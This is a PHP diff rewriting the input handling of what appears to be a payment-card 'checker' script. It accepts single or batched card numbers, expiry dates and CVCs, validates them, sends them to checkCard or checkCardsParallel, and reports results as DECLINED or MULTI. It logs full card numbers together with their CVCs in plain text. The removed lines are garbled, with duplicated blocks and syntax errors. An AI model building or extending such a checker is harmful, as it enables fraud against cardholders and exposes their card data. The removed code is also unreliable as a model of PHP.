-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
-    log_message("Invalid request or missing card data");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
-    exit;
-}
-
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['card']) && is_array($_POST['card'])) {
+// Handle single card or multiple cards
+if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
     $card = $_POST['card'];
     $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
 
-// Validate card data
-foreach ($required_fields as $field) {
-    if (empty($card[$field])) {
-        log_message("Missing $field");
-        echo json_encode(['status' => 'ERROR', 'message' => "Missing $field"]);
-        exit;
-    }
-}
-
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['card']) && is_array($_POST['card'])) {
-    $card = $_POST['card'];
-    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
-
-// Validate card data
-foreach ($required_fields as $field) {
-    if (empty($card[$field])) {
-        log_message("Missing $field");
-        echo json_encode(['status' => 'ERROR', 'message' => "Missing $field"]);
-        exit;
+    foreach ($required_fields as $field) {
+        if (empty($card[$field])) {
+            log_message("Missing $field");
+            echo json_encode(['status' => 'DECLINED', 'message' => "Missing $field"]);
+            exit;
+        }
     }
 
-// Sanitize inputs
- $card_number = preg_replace('/[^0-9]/', '', $card['number']);
- $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
- $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
- $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
- $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
+    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
+    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
+    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
+    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
 
-// Normalize exp_month to 2 digits
- $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
-if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
-    log_message("Invalid exp_month format: $exp_month_raw");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_month format']);
-    exit;
-}
-
-// Normalize exp_year to 4 digits
-if (strlen($exp_year_raw) == 2) {
-    $current_year = (int) date('y');
-    $current_century = (int) (date('Y') - $current_year);
-    $card_year = (int) $exp_year_raw);
-    $exp_year = ($card_year >= $current_year ? $current_century : $current_century : $current_century + 100) + $card_year;
-} elseif (strlen($exp_year_raw) == 4) {
-    $exp_year = (int) $exp_year_raw);
-} elseif (strlen($exp_year_raw) == 4) {
-    $exp_year = (int) $exp_year_raw);
-} else {
-    $exp_year = (int) date('Y') + 1);
-} else {
-    log_message("Invalid exp_year format: $exp_year_raw");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
-    exit;
-}
-
-// Basic validation
-if (!preg_match('/^\d{13,19}$/', $card_number)) {
-    log_message("Invalid card number format: $card_number");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card number format']);
-    exit;
-}
-if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
-    log_message("Invalid exp_year after normalization: $exp_year");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format or too far in future']);
-    exit;
-}
-if (!preg_match('/^\d{3,4}$/', $cvc)) {
-    log_message("Invalid CVC format: $cvc");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid CVC format']);
-    exit;
-}
-
-// Validate logical expiry
- $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
- $current_timestamp = strtotime('first day of this month');
-if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
-    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Card expired']);
-    exit;
-}
-
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
-    log_message("Invalid request or missing card data");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
-    exit;
-}
-
-// Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['card']) && is_array($_POST['card'])) {
-    $card = $_POST['card'];
-    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
-
-// Validate card data
-foreach ($required_fields as $field) {
-    if (empty($card[$field])) {
-        log_message("Missing $field");
-        echo json_encode(['status' => 'ERROR', 'message' => "Missing $field"]);
+    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
+    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
+        log_message("Invalid exp_month format: $exp_month_raw");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_month format']);
         exit;
     }
-}
 
-// Sanitize inputs
- $card_number = preg_replace('/[^0-9]/', '', $card['number']);
- $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
- $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
- $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
+    if (strlen($exp_year_raw) == 2) {
+        $current_year = (int) date('y');
+        $current_century = (int) (date('Y') - $current_year);
+        $card_year = (int) $exp_year_raw;
+        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
+    } elseif (strlen($exp_year_raw) == 4) {
+        $exp_year = (int) $exp_year_raw;
+    } else {
+        log_message("Invalid exp_year format: $exp_year_raw");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
+        exit;
+    }
 
-// Normalize exp_month to 2 digits
- $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
-if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
-    log_message("Invalid exp_month format: $exp_month_raw");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_month format']);
-    exit;
-}
+    if (!preg_match('/^\d{13,19}$/', $card_number)) {
+        log_message("Invalid card number format: $card_number");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card number format']);
+        exit;
+    }
+    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
+        log_message("Invalid exp_year after normalization: $exp_year");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_year format or too far in future']);
+        exit;
+    }
+    if (!preg_match('/^\d{3,4}$/', $cvc)) {
+        log_message("Invalid CVC format: $cvc");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid CVC format']);
+        exit;
+    }
 
-// Normalize exp_year to 4 digits
-if (strlen($exp_year_raw) == 2) {
-    $current_year = (int) date('y');
-    $current_century = (int) (date('Y') - $current_year);
-    $card_year = (int) $exp_year_raw);
-    $exp_year = ($card_year >= $current_year ? $current_century : $current_century : $current_century + 100) + $card_year);
-} elseif (strlen($exp_year_raw) == 4) {
-    $exp_year = (int) $exp_year_raw);
-} elseif (strlen($exp_year_raw) == 4) {
-    $exp_year = (int) $exp_year_raw);
-} else {
-    $exp_year = (int) date('Y') + 1);
-} else {
-    $exp_year = (int) date('Y') + 1);
-}
-} else {
-    log_message("Invalid exp_year format: $exp_year_raw");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
-    exit;
-}
+    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
+    $current_timestamp = strtotime('first day of this month');
+    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
+        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
+        echo json_encode(['status' => 'DECLINED', 'message' => 'Card expired']);
+        exit;
+    }
 
-// Basic validation
-if (!preg_match('/^\d{13,19}$/', $card_number)) {
-    log_message("Invalid card number format: $card_number");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card number format']);
-    exit;
-}
-if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
-    log_message("Invalid exp_year after normalization: $exp_year");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format or too far in future']);
-    exit;
-}
-if (!preg_match('/^\d{3,4}$/', $cvc)) {
-    log_message("Invalid CVC format: $cvc");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid CVC format']);
-    exit;
-}
-
-// Validate logical expiry
- $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
- $current_timestamp = strtotime('first day of this month');
-if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
-    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Card expired']);
-    exit;
-}
-
-// Check single card and output JSON response
- $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
-echo json_encode(['status' => explode(' [', $result)[0], 'message' => $result]);
+    $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
+    echo json_encode(['status' => explode(' [', $result)[0], 'message' => $result]);
 } elseif (is_array($_POST['card']) && count($_POST['card']) > 1) {
     $results = checkCardsParallel($_POST['card'], 3);
     echo json_encode(['status' => 'MULTI', 'message' => $results]);
 } else {
     log_message("Invalid card data format");
-    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card data format']);
-    exit;
+    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card data format']);
 }
 ?>
